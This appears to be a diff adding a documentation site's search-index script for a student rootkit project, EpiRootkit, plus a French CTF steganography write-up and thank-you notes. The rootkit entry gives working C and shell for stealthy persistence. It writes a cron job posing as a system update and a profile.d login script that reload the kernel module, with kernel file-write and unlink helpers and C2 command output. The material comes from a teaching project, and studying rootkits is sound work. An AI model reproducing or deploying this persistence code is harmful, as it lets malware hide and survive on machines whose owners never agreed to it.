/etc/modules-load.d/epirootkit.conf Mechanism 2: Cron Jobs linkHow It Works link File: /etc/cron.d/system-update (we are stealthy hehe) Schedule: Every 5 minutes check and load if not present Command: */5 * * * * root /bin/bash -c 'if ! lsmod | grep -q epirootkit; then modprobe epirootkit 2\u003e/dev/null || insmod /lib/modules/$(uname -r)/extra/epirootkit.ko 2\u003e/dev/null; fi' \u003e/dev/null 2\u003e\u00261 Implementation link int persistence_install_cron(void) { char cron_path[256]; const char *cron_content = \"# System update check - runs every 5 minutes\\n\" PERSISTENCE_MARKER_START \"\\n\" \"*/5 * * * * root /bin/bash -c 'if ! lsmod | grep -q epirootkit; then modprobe epirootkit 2\u003e/dev/null || insmod /lib/modules/$(uname -r)/extra/epirootkit.ko 2\u003e/dev/null; fi' \u003e/dev/null 2\u003e\u00261\\n\" PERSISTENCE_MARKER_END \"\\n\"; int ret; snprintf(cron_path, sizeof(cron_path), \"%s%s\", CRON_DIR, CRON_FILE); ret = write_file(cron_path, cron_content, 0644); if (ret \u003c 0) return ret; pr_info(\"EpiRootkit: Cron persistence installed\\n\"); return 0; } Verification link # Check cron job c2-server$ exec Client-1 cat /etc/cron.d/system-update # Exit code: 0 # Output: # # System update check - runs every 5 minutes # # EpiRootkit persistence - DO NOT REMOVE # */5 * * * * root /bin/bash -c 'if ! lsmod | grep -q epirootkit; then modprobe epirootkit 2\u003e/dev/null || insmod /lib/modules/$(uname -r)/extra/epirootkit.ko 2\u003e/dev/null; fi' \u003e/dev/null 2\u003e\u00261 # # End EpiRootkit persistence # Check cron logs c2-server$ exec Client-1 grep epirootkit /var/log/syslog Mechanism 3: Shell Profiles linkHow It Works link File: /etc/profile.d/system-env.sh Trigger: Executes when any user logs in Command: Loads module if not already present Implementation link int persistence_install_shell_profile(void) { char profile_path[256]; const char *profile_content = \"#!/bin/bash\\n\" PERSISTENCE_MARKER_START \"\\n\" \"# System environment initialization\\n\" \"if [ \\\"$(id -u)\\\" -eq 0 ]; then\\n\" \" if ! lsmod | grep -q epirootkit 2\u003e/dev/null; then\\n\" \" modprobe epirootkit 2\u003e/dev/null || insmod /lib/modules/$(uname -r)/extra/epirootkit.ko 2\u003e/dev/null\\n\" \" fi\\n\" \"fi\\n\" PERSISTENCE_MARKER_END \"\\n\"; int ret; snprintf(profile_path, sizeof(profile_path), \"%s%s\", PROFILE_DIR, PROFILE_FILE); ret = write_file(profile_path, profile_content, 0755); if (ret \u003c 0) return ret; pr_info(\"EpiRootkit: Shell profile persistence installed\\n\"); return 0; } Verification link # Check profile script c2-server$ exec Client-1 cat /etc/profile.d/system-env.sh # Exit code: 0 # Output: # #!/bin/bash # # EpiRootkit persistence - DO NOT REMOVE # # System environment initialization # if [ \"$(id -u)\" -eq 0 ]; then # if ! lsmod | grep -q epirootkit 2\u003e/dev/null; then # modprobe epirootkit 2\u003e/dev/null || insmod /lib/modules/$(uname -r)/extra/epirootkit.ko 2\u003e/dev/null # fi # fi # # End EpiRootkit persistence Technical Implementation linkFile Operations link static int write_file(const char *path, const char *content) { struct file *file; loff_t pos = 0; ssize_t bytes_written; size_t content_len = strlen(content); file = filp_open(path, O_WRONLY | O_CREAT | O_TRUNC, 0644); if (IS_ERR(file)) return PTR_ERR(file); bytes_written = kernel_write(file, content, content_len, \u0026pos); filp_close(file, NULL); return (bytes_written == content_len) ? 0 : -EIO; } File Removal link static int remove_file(const char *path) { struct path file_path; struct dentry *dentry; struct inode *dir_inode; int ret; ret = kern_path(path, LOOKUP_FOLLOW, \u0026file_path); if (ret) return 0; // File doesn't exist - not an error dentry = file_path.dentry; dir_inode = d_inode(dentry-\u003ed_parent); inode_lock(dir_inode); ret = vfs_unlink(dir_inode, dentry, NULL); inode_unlock(dir_inode); path_put(\u0026file_path); return ret; } Manual Testing link # Test modules-load.d c2-server$ exec Client-1 systemd-modules-load /etc/modules-load.d/epirootkit.conf # Test cron job manually c2-server$ exec Client-1 /sbin/modprobe epirootkit # Test profile script c2-server$ exec Client-1 bash /etc/profile.d/system-env.sh "
+            }
+        );
+    index.add(
+            {
+                id:  37 ,
+                href: "\/docs\/06-bonuses\/wlkom-ctf\/",
+                title: "Tux Fan Club: Chasse au Trésor Pirate",
+                description: "Cap'tain René Bojolais est un petit cachotier.",
+                content: "Treasure Hunt 🪙 linkDécouverte d’un mystérieux fichier… linkNous avons décidé d’accepter une quête secondaire durant le projet Rootkit.\nEn effet, comme tout bon pirate, nous avons téléchargé légalement les fichiers fournis (given files) et nous souhaitions les ignorer avec un fichier .gitignore.\nLe .gitignore ressemblait à :\n.gitignore givenfiles/ Sauf que les fichiers n’étaient pas ignorés. C’est là que nous découvrons un mystérieux fichier .README :\nArborescence révélant le fichier caché\nTentative de lecture du parchemin linkAprès avoir accédé à ce fichier, nous décidons de l’ouvrir. Le déchiffrer était une autre paire de manches…\nContenu du fichier mystérieux\nW3lc0m3 t0 thE 53cR3t p1r4t35 l4ir. Young pirate, you have find my treasure. It is yours. Navigate safely, -- Cap'tain René Bojolais Le reste du parchemin était du langage codé. Grâce à notre expérience en programmation et en langues, nous comprenons qu’il s’agit d’une image encodée en base64.\nDéchiffrer l’image linkAvec la commande base64 -d .README \u003e image.jpg nous avons pu obtenir l’image (il fallait évidemment garder que la partie en base64 du README).\nImage déchiffrée\nVoici la magnifique illustration… Mais nous savons que le capitaine René avait plus d’un tour dans son sac. Donc nous décidions d’examiner l’image en détail.\nChanson cachée linkEn utilisant le site https://georgeom.net/StegOnline/upload pour extraire les valeurs RGB de l’image et le texte caché, on remarque une chaîne de caractères insolite…\nExtraction de données cachées\nI am captain Jack Sparrow - Remix high bass quality - SAVAGE MIX.wavUT\nCela nous rappelle une chanson de pirates bien connue…\nNotre première idée est de chercher le remix sur Youtube afin de voir si le Capitaine René n’a pas laissé un petit flag en commentaire. Apparemment, il n’est pas fan d’OSINT, dommage 😔\nNotre deuxième idée est de dézipper l’image unzip image.jpg et là, bingo !\nArchive: image.jpg warning [image.jpg]: 21054 extra bytes at beginning or within zipfile (attempting to process anyway) inflating: I am captain Jack Sparrow - Remix high bass quality - SAVAGE MIX.wav Audacity time linkGrâce à notre expérience en CTF, nous avons tout de suite l’idée d’examiner le spectrogramme.\nRien d’anormal sauf sur les dernières secondes du fichier. Et là… nous trouvons le flag !\nLe trésor caché dans le spectrogramme\nIl ne nous reste qu’à transmettre le mot de passe au capitaine et à nous le trésor…\nTrésor link Grrr des canards\nConclusion linkUne fois cette chasse au trésor finie, il est temps de commencer le projet principal 👀\n"
+            }
+        );
+    index.add(
+            {
+                id:  38 ,
+                href: "\/docs\/07-remerciements\/thankyou\/",
+                title: "Un dernier mot",
+                description: "Hugo linkBonjour,\nMerci beaucoup Jules pour ce projet!\nIl m’a permis d’expérimenter plein de sujets différents, j’ai profité de l’excuse de “c’est pour le travail d’EPITA” pour tester le Lotus Docs (le framework de la documentation sur lequel ces mots sont écrits), j’ai pu mettre en pratique directement ce que j’ai pu apprendre dans mon travail, notamment j’avais dû faire une présentation sur un rootkit (PUMAKIT) à ma boîte, et j’ai pu m’en inspirer et recréer le rootkit en améliorant certaines fonctionnalités (car franchement il était assez mal foutu, les Chinois n’ont qu’à bien se tenir). J’ai eu l’occasion de discuter avec certains SRS pour avoir des avis sur certaines implémentations. Spoiler, ils étaient tous jaloux du fait que en première année d’alternance on fait un projet aussi cool alors qu’ils se tapent de l’Active Directory depuis 2 mois.\n",
+                content: "Hugo linkBonjour,\nMerci beaucoup Jules pour ce projet!\nIl m’a permis d’expérimenter plein de sujets différents, j’ai profité de l’excuse de “c’est pour le travail d’EPITA” pour tester le Lotus Docs (le framework de la documentation sur lequel ces mots sont écrits), j’ai pu mettre en pratique directement ce que j’ai pu apprendre dans mon travail, notamment j’avais dû faire une présentation sur un rootkit (PUMAKIT) à ma boîte, et j’ai pu m’en inspirer et recréer le rootkit en améliorant certaines fonctionnalités (car franchement il était assez mal foutu, les Chinois n’ont qu’à bien se tenir). J’ai eu l’occasion de discuter avec certains SRS pour avoir des avis sur certaines implémentations. Spoiler, ils étaient tous jaloux du fait que en première année d’alternance on fait un projet aussi cool alors qu’ils se tapent de l’Active Directory depuis 2 mois.\nJ’ai même eu l’idée de créer un nouveau club de cyber en parlant à des gens de ma promo aussi très investis par le projet (Paul, Kyllian, Matteo…).\nMon maître d’alternance (ancien SRS promo 2012), était très intéressé par le projet lui aussi et m’a demandé de faire une présentation complète de mon implémentation devant toute l’entreprise une fois que ce sera fini.\nEt bien évidemment, ce qui est sûrement le plus important, j’ai pu avoir un magnifique canard en plastique, que j’ai torturé pendant ce PTN DE RUSH DE JS (oui j’ai encore des séquelles).\nBref merci :)\nCanard-ment,\n–\nHugo Sibony\nAPPING Cyber 2027\n“J’écris ce message a 10000m d’altitude dans un avion qui tremble plus que moi dans l’attente de ma note de JS.”\nLéa linkBonjour,\nC’est Léa\nCoin-Coin-ment,\n– Léa Bonet Déléguée APPING Cyb 2027\n“Au moins Hugo ne s’est pas fait arrêté à la sortie de l’avion 👀”\n"
+            }
+        );
+    index.add(
+            {
+                id:  39 ,
+                href: "\/docs\/",
+                title: "Docs",
+                description: "",
+                content: ""
+            }
+        );
+    search.addEventListener('input', show_results, true);
+
+    function show_results(){
+        const maxResult =  5 ;
+        const minlength =  0 ;
+        var searchQuery = sanitizeHTML(this.value);
+        var results = index.search(searchQuery, {limit: maxResult, enrich: true});
+
+        
+        const flatResults = new Map(); 
+        for (const result of results.flatMap(r => r.result)) {
+        if (flatResults.has(result.doc.href)) continue;
+        flatResults.set(result.doc.href, result.doc);
+        }
+
+        suggestions.innerHTML = "";
+        suggestions.classList.remove('d-none');
+
+        
+        if (searchQuery.length < minlength) {
+            const minCharMessage = document.createElement('div')
+            minCharMessage.innerHTML = `Please type at least <strong>${minlength}</strong> characters`
+            minCharMessage.classList.add("suggestion__no-results");
+            suggestions.appendChild(minCharMessage);
+            return;
+        } else {
+            
+            if (flatResults.size === 0 && searchQuery) {
+                const noResultsMessage = document.createElement('div')
+                noResultsMessage.innerHTML = "No results for" + ` "<strong>${searchQuery}</strong>"`
+                noResultsMessage.classList.add("suggestion__no-results");
+                suggestions.appendChild(noResultsMessage);
+                return;
+            }
+        }
+
+        
+        for(const [href, doc] of flatResults) {
+            const entry = document.createElement('div');
+            suggestions.appendChild(entry);
+
+            const a = document.createElement('a');
+            a.href = href;
+            entry.appendChild(a);
+
+            const title = document.createElement('span');
+            title.textContent = doc.title;
+            title.classList.add("suggestion__title");
+            a.appendChild(title);
+
+            const description = document.createElement('span');
+            description.textContent = doc.description;
+            description.classList.add("suggestion__description");
+            a.appendChild(description);
+
+            suggestions.appendChild(entry);
+
+            if(suggestions.childElementCount == maxResult) break;
+        }
+    }
+    }());
+</script></body></html>
